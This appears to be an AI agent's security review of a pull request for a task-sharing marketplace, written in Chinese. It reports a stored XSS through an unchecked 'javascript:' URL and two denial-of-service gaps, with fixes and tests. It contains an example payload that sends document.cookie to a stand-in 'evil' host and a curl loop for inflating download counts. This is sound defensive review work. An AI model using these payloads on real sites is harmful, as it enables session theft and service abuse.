# PR #27 返工报告 — Task Sharing Marketplace

> 审查人:ugk-pi-agent(对抗性审查 + 本地复现)
> PR:https://github.com/mhgd3250905/ugk-tui/pull/27
> 分支:`feature/task-sharing-site` → `main`
> 审查日期:2026-06-30
> 验证基线:本地 checkout 跑 `npm test` = **514/514/0**(与 PR 描述一致,不是假绿)

---

## 总体评价

功能完整、架构合理(CLI 校验集中、CF Functions 用 DIP 拆分、生成产物与逻辑分离)、测试扎实(514 全绿)。**SQL 注入 / 路径穿越 / OAuth CSRF / Session 伪造 / Admin 授权 / 密钥管理 / D1 迁移** 这些对抗项全部核实通过,做得很好。

但有 **1 个真 XSS 漏洞必须修复后才能合并**(中危,可导致账户接管),另有 **2 个低危 DoS** 建议同批处理(不阻塞合并,但记着)。

---

## ✅ 已核实安全(无需改动,供参考)

| 项 | 结论 |
|---|---|
| SQL 注入 | 全 `.prepare().bind()` 参数化,零字符串拼接 ✓ |
| 路径穿越 | task name 走 D1 主键不进文件路径;R2 key 服务端生成 `submissions/${uid}/${ts}-${safeFileName}`;CLI 校验 `/^[A-Za-z0-9_-]+$/` 拒 `..` ✓ |
| OAuth CSRF | state cookie+param 校验(`githubLogin`/`githubCallback`)✓ |
| Session 伪造 | HMAC 签名,无 `SESSION_SECRET` 则 fail-closed ✓ |
| Admin 授权 | `env.ADMIN_GITHUB_LOGINS` 白名单,admin endpoint 全过 `requireAdmin` ✓ |
| 密钥 | 全从 `env.*` 读,`wrangler.toml` 无密钥 ✓ |
| D1 迁移 | 全 `CREATE TABLE IF NOT EXISTS`,无破坏性 DROP ✓ |

---

## 🔴 必修:存储型 XSS 经 `sourceUrl` → 账户接管

### 根因

两处缺防护,任一修复即堵住漏洞,**建议两端都做**:

**(1) 后端提交校验缺 scheme 白名单** — `functions/_lib/marketplace.js:241`

```js
const sourceUrl = cleanText(form.get("sourceUrl"));
// cleanText 只 trim,不校验 scheme —— javascript:/data: 都能存进 D1
```

**(2) 前端渲染把 sourceUrl 直接拼进 href** — 生成器源头 `scripts/build-task-share.mjs:181`(被复制进 16 个 HTML 的内联脚本)

```js
'<a class="btn btn-primary" href="'+esc(t.downloadUrl||t.sourceUrl||'#')+'">Download</a>'
```

`esc()` 转义了 `& < > " '`,但 `javascript:alert(1)` **不含这些字符**,原样进 href。实测确认:

```js
// esc 后:
"javascript:fetch(document.cookie)"   → "javascript:fetch(document.cookie)"  // 原样!
"javascript:alert(1)"                  → 原样
```

### 攻击链

1. 攻击者 `POST /api/tasks/submit`,带 `sourceUrl: "javascript:fetch('//evil/?c='+document.cookie)"`(提交端 `cleanText` 只 trim,无 scheme 校验)
2. admin 审核通过(community 流 `WHERE status='published'`)→ 进 `/api/community/tasks`
3. 受害者打开市场页(**所有 16 个页面**含 index/admin/account/各 task detail 的内联 `refreshCommunity()` 都渲染)
4. 受害者点 "Download" → 执行 JS → `document.cookie` 含 `ugk_session`(`SameSite=Lax` 在顶级导航会发)→ **session 泄漏 = 账户接管**

### 严重性:中危(需 admin approve 触发,但影响面大)

- **admin 自己审核时点 Download 也会中招** → session 被盗 = 拿到 admin 权限(最严重后果)
- approve 后所有访客受害,16 个页面任一都可触发
- `community/tasks` 流 `WHERE status='published'` 降低了概率(不能随便提交就触发),但 admin 审核环节本身是攻击面

### 修复方案(两端都做)

**后端** `functions/_lib/marketplace.js` `submitTask` 里,校验 sourceUrl scheme(在 line 241 之后):

```js
if (sourceUrl) {
    try {
        if (!/^https?:$/i.test(new URL(sourceUrl).protocol)) {
            return json({ error: "invalid_url_scheme" }, { status: 400 });
        }
    } catch {
        return json({ error: "invalid_url" }, { status: 400 });
    }
}
```

**前端** `scripts/build-task-share.mjs:174` 的 `esc` 不动(它职责是 HTML 转义,不该管 URL),在渲染 href 处加 scheme 白名单 —— 加一个 `safeHref(url)` 辅助:

```js
function safeHref(url) {
    const u = String(url ?? "");
    return /^https?:\/\//i.test(u) ? esc(u) : "#";
}
// 渲染处:把 esc(t.downloadUrl||t.sourceUrl||'#') 改成 safeHref(t.downloadUrl||t.sourceUrl)
```

改完**必须重新跑 `node scripts/build-task-share.mjs`** 重新生成 `docs/task-share/**/*.html`(`esc` 的改动在 16 个文件各有副本,源头改了重生成才一致)。

### 回归测试建议

`tests/task-marketplace-functions.test.ts` 加用例:提交 `sourceUrl: "javascript:alert(1)"` 应返回 400;`sourceUrl: "https://x.com"` 应通过。`tests/task-share-site.test.ts` 加用例:含 `javascript:` 的 sourceUrl 渲染进 href 后应为 `#`。

---

## 🟡 建议同批:下载计数可无限刷量(低危 DoS)

**位置**:`functions/_lib/marketplace.js:471` `recordDownload`

```js
export async function recordDownload(request, env, name) {
    const user = await sessionUser(request, env);
    await ensureTask(env, name);
    await env.DB.prepare("INSERT INTO download_events ...").bind(...).run();
    await env.DB.prepare("UPDATE tasks SET download_count = download_count + 1 ...").bind(name).run();
}
```

每次 POST `count+1`,无去重、无频率限制。对比:`like`/`favorite`/`report` 都有 `UNIQUE(task_name,user_id)` 去重(migrations 里),唯独 download 没有。

一行 `while true; do curl -XPOST .../api/tasks/x/download; done` 能把任意 task 刷到百万下载,`/api/stats` 失真,`download_events` 表无限膨胀。

**修复方向**:对 (task_name, client IP 或 user_id) 做去重(像 like 一样 UNIQUE,或 KV 缓存窗口),或至少加最小频率限制。早期市场阶段可降级处理,但提交任务页既然要求认证,download 也建议至少按认证用户去重。

---

## 🟡 建议同批:R2 上传无大小/频率限制(低危 DoS)

**位置**:`functions/_lib/marketplace.js:254` `submitTask`

```js
await env.TASK_UPLOADS.put(artifactKey, await artifact.arrayBuffer(), {...});
// artifact.arrayBuffer() 前无 size 检查
```

认证用户可提交无限大附件,填满 `ugk-task-uploads` bucket。`artifact_name` 已用 `safeFileName` 清理(路径安全没问题),纯粹是滥用/DoS。

**修复方向**:`arrayBuffer()` 前加 `if (artifact.size > MAX_BYTES) return json({error:"too_large"},{status:413})`(建议 10-25MB),并对每用户的 pending submission 做频率限制。

---

## 合并建议

**修 XSS 后可合并**(2 个低危 DoS 可记 issue 后续做,不阻塞,但如果同批改更好)。

XSS 修复涉及:后端校验(~5 行) + 生成器 `safeHref`(~3 行) + 重新生成 16 个 HTML + 2 个测试用例。改动小、闭环清晰。

---

## 审查方法说明

派 sub agent 初审 CF Functions 安全 → **逐条复核源码**(sub agent 把 XSS 代码位置标错了——说在 marketplace.js,实际 esc/href 在 build-task-share.mjs 生成的内联 HTML;但核心判断"javascript: scheme 绕过 esc"是对的,我重新追踪确认了真实渲染路径)。sub agent 报的 SQL 注入/路径穿越/auth 等高危项经核实均安全,不采纳为问题。测试基线本地复现 514/514/0,非假绿。
